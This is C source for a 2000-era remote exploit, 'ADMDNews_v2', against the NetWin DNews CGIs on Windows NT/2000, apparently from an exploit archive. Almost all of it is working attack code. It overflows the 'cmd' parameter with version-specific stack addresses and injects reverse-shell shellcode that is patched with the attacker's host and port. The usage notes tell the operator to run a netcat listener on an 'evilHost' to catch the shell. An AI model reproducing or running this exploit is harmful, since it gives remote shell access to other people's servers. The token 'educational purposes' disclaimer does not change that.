/**
***			 ADM PRIVATE DO NOT DISTRIBUTE #@#!*&@#!
***
***
***
***  ADMDNews_v2 - WinNT/Win2K x86 exploit for NetWin (www.netwinsite.com)
***				   DNews server (v5.0f - v5.3e3) gupcgi.exe/dnewsweb.exe CGIs.
***
***	 This program exploits the buffer overflow condition in gupcgi.exe/dnewsweb.exe CGIs
***  while processing the "cmd" parameter. Credit for discovering this vulnerability goes to
***  plaguez <ndubee@df.ru> (j3w k1ck 4ss br0!!) :>
*** 
***  Tested and confirmed under WinNT 4.0 SP5/SP6 & Win2K Beta 3 RC2 (build 2128)
***
***  Usage: ADMDNews <victimHost> <victimPort> <victimPath> <evilHost> <evilPort> <DNewsVersion>
***
***	 First setup netcat on <evilHost> to listen on <evilPort>
***
***	 Ex: nc -l -p <evilPort> -v -v
***
***	 Then run the exploit against <victimHost> web server on <victimPort> where
***  <victimPath> is the path of the vulnerable CGI. <DNewsVersion> is set 
***  according to the version of the DNews server package you are exploting. Please
***	 look in program usage information for the codes corresponding to each
***  version.
***
***  THIS CODE IS ONLY FOR EDUCATIONAL PURPOSES. USE ONLY IN AN ETHICAL MANNER.
***
***  
***  
***  1st March 2000
***  
***  Joey__ <youcan_reachme@hotmail.com> 
**/
#include <windows.h>
#include <stdio.h>



/*
	Win9x tables

static unsigned int TableESP[1] = {0x636934};
static unsigned int TableFillSize[1] = {2004-1259};
static unsigned int TableWritableAddr[1] = {0x412000};
*/

/*
	WinNT 4.0 tables
*/
static unsigned int TableESP[7] =	{0x00116abc,
									 0x0012f2ec,
									 0x0012f2f0,
									 0x0012f2f0,
									 0x0012f2e8,
									 0x0012f2e8,
									 0x0012f2ec
									};

static unsigned int TableFillSize[7] =	{2004,
										 2000,
										 2000,
										 2000,
										 2000,
										 2000,
										 2000
										};

static unsigned int TableWritableAddr[7] =	{0x00412000,
											 0x00444000,
											 0x0043e000,
											 0x0043e000,
											 0x00441000,
											 0x00441000,
											 0x00444000
											};



void print_banner()
{
	printf ("ADMDNews - ADM PRIVATE DO NOT DISTRIBUTE #@#!*&@#!\n");
	printf ("(c) 2000, Joey__ <youcan_reachme@hotmail.com>\n");
	printf ("gr33tz - theowl,__ice,antilove,plaguez,horizon,xaphan,neonsurge,instd,duke_,stran9er,freeLSD,DiGit,ktwo,klog,cheez,rfp,acpizer\n\n");
}



void print_versions()
{
	printf("\nVersions\n");
	printf("0 - gupcgi.exe v5.0f - v5.3e3\n");
	printf("1 - dnewsweb.exe v5.3d5\n");
	printf("2 - dnewsweb.exe v5.0f\n");
	printf("3 - dnewsweb.exe v5.0j2\n");
	printf("4 - dnewsweb.exe v5.2b2\n");
	printf("5 - dnewsweb.exe v5.2b3\n");
	printf("6 - dnewsweb.exe v5.3e3\n");
}



void encodeHex(char* &pszTarget, int iByte)
{
	*pszTarget++ = '%';
	sprintf(pszTarget, "%02X", iByte & 0xff);
	pszTarget+=2;
}



bool resolve (SOCKADDR_IN &anAddr, char* host, char*port)
{
	HOSTENT hse;
	HOSTENT *he = &hse;
	unsigned long addr;



	anAddr.sin_family = AF_INET;
    anAddr.sin_port = htons(atoi(port));
    
	if (INADDR_NONE == (addr = inet_addr(host)))
	{
		if(NULL == (he = gethostbyname(host))) 
			return (false);
		anAddr.sin_addr.S_un.S_addr = *((unsigned long *)(he->h_addr_list[0]));
	}
	else
		anAddr.sin_addr.S_un.S_addr = addr;

	return(true);
}



void main(int argc, char* argv[])
{
	char* pszReq = "GET %s?cmd=%s%s%s HTTP/1.1\r\nHost: %s\r\n\r\n";
	char szReqBuf[65536];
	char szFillBuf[65536];
	char szESPBuf[64];
	char szShellCodeBuf[65536];
	char* pszFill = NULL;
	char* pszESP = NULL;
	char* pszShellCode = NULL;
	unsigned int iFillSize,iESP,iWritableAddr;

	FILE* fSploit;
	unsigned int iSploitSize;
	char* pSploitBuf;
	
	WSADATA wsaData;
	SOCKADDR_IN victimAddr;
	SOCKADDR_IN evilAddr;
	SOCKET s;
	unsigned int i, iVer;



	print_banner();
	
	if (argc < 7)
	{
		printf("Usage: %s <victimHost> <victimPort> <victimPath> <evilHost> <evilPort> <DNewsVersion>\n", argv[0] );
		print_versions();
		exit(1);
	}
	
	char *victimHost = argv[1];
	char *victimPort = argv[2];
	char *victimPath = argv[3];
	char *evilHost = argv[4];
	char *evilPort = argv[5];
	char *dnewsVersion = argv[6];

	if (NULL == (fSploit = fopen ( "reverse-shell-v1", "rb")))
	{
		printf ("wh0 fux0r3d d4 spl01t c0d3?\n");
		exit(2);
	}
	fseek(fSploit, 0, SEEK_END);
	iSploitSize = ftell (fSploit);
	fseek(fSploit, 0, SEEK_SET);
	pSploitBuf = (char *)malloc(iSploitSize);
	fread(pSploitBuf,1,iSploitSize,fSploit);
	fclose(fSploit);
	
	iVer = atoi(dnewsVersion);
	iWritableAddr = TableWritableAddr[iVer];	
	iFillSize = TableFillSize[iVer] - iSploitSize;
	iESP = TableESP[iVer];
	
 	pszESP = szESPBuf;
	encodeHex (pszESP,((byte*)(&iESP))[0]);
	encodeHex (pszESP,((byte*)(&iESP))[1]);
	encodeHex (pszESP,((byte*)(&iESP))[2]);
	encodeHex (pszESP,((byte*)(&iESP))[3]);
	*pszESP = 0x00;
	pszESP = szESPBuf;
	
	pszFill = szFillBuf;
	for (i=0;i<iFillSize;i++)
		*pszFill++ = 'A';
	*pszFill =0x00;
	pszFill = szFillBuf;
	
	const WORD wMinVer = 0x0101;
	if( 0 != WSAStartup( wMinVer, &wsaData ) )
	{
		printf ("n0 w1nz00k3!\n");
		exit(3);
	}

	if (!(resolve(victimAddr,victimHost,victimPort)))
	{
		WSACleanup();
		printf ("fux0r3d v1ct1m h0st/p0rt!\n");
		exit(4);
	}

	if (!(resolve(evilAddr,evilHost,evilPort)))
	{
		WSACleanup();
		printf ("fux0r3d 3v1l h0st/p0rt!\n");
		exit(5);
	}

	*((DWORD *)(pSploitBuf+0x2f)) = iWritableAddr;
	*((DWORD *)(pSploitBuf+0x38e)) = evilAddr.sin_addr.S_un.S_addr;
	*((WORD *)(pSploitBuf+0x38c)) = evilAddr.sin_port;
	
	pszShellCode = szShellCodeBuf;
	for (i=0;i<iSploitSize;i++) {
		if (iVer)
		{
			switch (pSploitBuf[i]) {
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
				case 12:
				case 13:
				case 14:
				case 15:
				case 16:
				case 17:
				case 18:
				case 19:
				case 20:
				case 21:
				case 22:
				case 23:
				case 24:
				case 25:
				case 26:
				case 27:
				case 28:
				case 29:
				case 30:
				case 31:
				case '-':
				case '%':
				case '~':
				case '+':
				case '<':
				case '>':
				case '&':
				case '^':
				case '$':
				case '#':
				case '@':
				case '!':
				case '/':
				case '\\':
					encodeHex (pszShellCode,pSploitBuf[i]);
					break;

				case ' ':
					*pszShellCode++ = '+';
					break;

				default:
					*pszShellCode++ = pSploitBuf[i] & 0xff;
					break;
			}
		}
		else
			encodeHex (pszShellCode,pSploitBuf[i]);
	}
	*pszShellCode =0x00;
	pszShellCode = szShellCodeBuf;

	if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)))
	{
		WSACleanup();
		printf ("s0ck3t t0 v1ct1m fux0r3d!\n");
		exit(6);
	}
	
	if (0 != connect(s, (struct sockaddr *)&victimAddr, sizeof(struct sockaddr)))
	{
		closesocket(s);
		WSACleanup();
		printf ("c0nn3ct t0 v1ct1m fux0r3d!\n");
		exit(7);
	}
	
	sprintf(szReqBuf,pszReq,victimPath,pszShellCode,pszFill,pszESP,victimHost);

	if(-1 == send(s,szReqBuf,strlen(szReqBuf),0))
	{
		closesocket(s);
		WSACleanup();
		printf ("g3t r3qu3st t0 v1ct1m fux0r3d!\n");
		exit(8);
	}

	printf("wh0a!!!\n");
	closesocket(s);
	WSACleanup();
	exit(0);
}
/*                    www.hack.co.za           [10 May]*/